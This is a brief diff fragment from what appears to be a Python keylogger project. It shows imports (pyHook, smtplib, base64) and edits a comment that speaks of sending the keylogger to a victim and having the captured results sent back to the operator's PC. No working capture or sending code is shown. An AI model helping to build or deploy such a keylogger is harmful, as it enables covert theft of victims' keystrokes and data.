@@ -7,7 +7,8 @@ import pyHook,os,time,random,smtplib,string,base64
 t="";pics_names=[]
 
 
-#Note: You have to edit this part from sending the keylogger to the victim
+#Note: You have fill out this form, if you want to send the results to your pc.
+
 
 #########Settings########
 
